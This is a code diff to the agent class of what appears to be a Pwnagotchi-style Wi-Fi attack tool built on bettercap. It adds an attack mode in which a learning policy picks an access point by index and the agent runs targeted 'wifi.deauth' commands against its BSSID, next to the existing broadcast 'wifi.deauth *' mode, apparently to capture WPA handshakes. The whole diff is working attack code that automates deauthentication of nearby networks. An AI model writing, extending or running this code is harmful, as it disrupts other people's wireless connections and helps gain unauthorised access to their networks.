@@ -49,6 +49,7 @@ class Agent(Client, Automata, AsyncAdvertiser, AsyncTrainer):
         self.mode = 'auto'
         self.current_attack_mode = 0  # 0: Passive, 1: Broadcast Deauth, 2: Targeted Deauth
         self.ai_channel_weights = {} # For AI-controlled channel priorities
+        self.current_target_ap_index = -1 # For AI-selected target AP (-1 or None if no target)
 
         if not os.path.exists(config['bettercap']['handshakes']):
             os.makedirs(config['bettercap']['handshakes'])
@@ -157,11 +158,16 @@ class Agent(Client, Automata, AsyncAdvertiser, AsyncTrainer):
             logging.info(f"[ai] AI updated channel_weights from {self.ai_channel_weights} to {new_channel_weights}")
             self.ai_channel_weights = new_channel_weights
 
+        new_target_ap_index = policy.get('target_ap_index', -1) # Default to -1 (invalid index)
+        if new_target_ap_index != self.current_target_ap_index:
+            logging.info(f"[ai] AI changed target_ap_index from {self.current_target_ap_index} to {new_target_ap_index}")
+            self.current_target_ap_index = new_target_ap_index
+
         # Simplified handling for other parameters from AI policy
         # A full implementation would merge this with AsyncTrainer's on_ai_policy if Agent inherits it directly for this
         personality = self._config['personality']
         for param_name, value in policy.items():
-            if param_name == 'attack_mode' or param_name == 'channel_weights':  # Already handled above
+            if param_name in ('attack_mode', 'channel_weights', 'target_ap_index'):  # Already handled above
                 continue
 
             if param_name in personality:
@@ -180,21 +186,47 @@ class Agent(Client, Automata, AsyncAdvertiser, AsyncTrainer):
                      logging.warning(f"[ai] AI tried to set unknown parameter: {param_name} to {value}")
 
 
-    def _handle_broadcast_deauth(self):
+    def _handle_ai_deauth_actions(self):
+        if not self._config['personality']['deauth']: # Respect global deauth toggle
+            logging.debug("[ai] Deauth actions skipped (deauth personality globally disabled).")
+            return
+
         if self.current_attack_mode == 1: # Mode 1 is Broadcast Deauth
-            if self._config['personality']['deauth']: # Respect global deauth toggle
-                logging.info("[ai] Attack Mode 1: Triggering broadcast deauthentication.")
-                try:
-                    self.run('wifi.deauth *')
-                    self._epoch.track(deauth=True, inc=1) # Track as a deauth action
-                except Exception as e:
-                    logging.error(f"[ai] Error during broadcast deauth: {e}")
+            logging.info("[ai] Attack Mode 1: Triggering broadcast deauthentication.")
+            try:
+                self.run('wifi.deauth *')
+                self._epoch.track(deauth=True, inc=1)
+            except Exception as e:
+                logging.error(f"[ai] Error during broadcast deauth: {e}")
+
+        elif self.current_attack_mode == 2: # Mode 2 is AI-Selected Targeted Deauth
+            if self.current_target_ap_index is not None and self.current_target_ap_index >= 0:
+                epoch_data = self._epoch.data() # Call once
+                featured_bssids = epoch_data.get('_featured_ap_bssids', [])
+
+                if 0 <= self.current_target_ap_index < len(featured_bssids):
+                    target_bssid = featured_bssids[self.current_target_ap_index]
+                    if target_bssid: # Check if BSSID is not None or empty
+                        logging.info(f"[ai] Attack Mode 2: Performing AI-selected targeted deauth on BSSID {target_bssid} (index {self.current_target_ap_index}).")
+                        try:
+                            self.run(f'wifi.deauth {target_bssid}')
+                            self._epoch.track(deauth=True, inc=1)
+                        except Exception as e:
+                            logging.error(f"[ai] Error during AI-selected targeted deauth on {target_bssid}: {e}")
+                    else:
+                        logging.debug(f"[ai] Attack Mode 2: AI selected target_ap_index {self.current_target_ap_index}, but BSSID is None (padding). No deauth.")
+                else:
+                    logging.warning(f"[ai] Attack Mode 2: AI selected target_ap_index {self.current_target_ap_index} is out of bounds for featured_bssids list (len {len(featured_bssids)}). No deauth.")
             else:
-                logging.debug("[ai] Attack Mode 1: Broadcast deauth skipped (deauth personality globally disabled).")
+                logging.debug(f"[ai] Attack Mode 2: No valid target_ap_index ({self.current_target_ap_index}). No AI-selected targeted deauth.")
+
+        elif self.current_attack_mode == 0: # Passive
+            logging.debug("[ai] Attack Mode 0 (Passive): No deauth actions taken by _handle_ai_deauth_actions.")
+            # No active deauth actions in passive mode
 
     def recon(self):
-        # Call broadcast deauth handler based on AI mode
-        self._handle_broadcast_deauth()
+        # Call AI deauth handler based on AI mode
+        self._handle_ai_deauth_actions()
 
         recon_time = self._config['personality']['recon_time']
         max_inactive = self._config['personality']['max_inactive_scale']
